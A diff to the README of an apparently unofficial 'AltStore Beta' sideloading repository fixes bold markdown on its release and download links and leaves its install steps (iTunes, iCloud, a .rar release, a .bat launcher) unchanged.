@@ -1,12 +1,12 @@
 # AltStore-Beta
-AltStore Beta - Sideload every iPA **[Releases](https://github.com/Thunder7yoshi/AltStore-Beta/releases/)
+AltStore Beta - Sideload every iPA **[Releases](https://github.com/Thunder7yoshi/AltStore-Beta/releases/)**
 
 # Before Installing:
 - Download the latest version of iTunes directly from Apple (not the Microsoft Store).
 - Download the latest version of iCloud directly from Apple (not the Microsoft Store).
 
 # Installing 
-- Download AltServer Beta from **[Here](https://github.com/Thunder7yoshi/AltStore-Beta/releases/download/v1.2.2b/AltServer.Beta.Build.rar)
+- Download AltServer Beta from **[Here](https://github.com/Thunder7yoshi/AltStore-Beta/releases/download/v1.2.2b/AltServer.Beta.Build.rar)**
 - Extract the downloaded “AltServer Beta Build.rar” file.
 - Launch AltServer by double-clicking on AltServer.bat file
   (it will appear as an icon in the Notification Area).
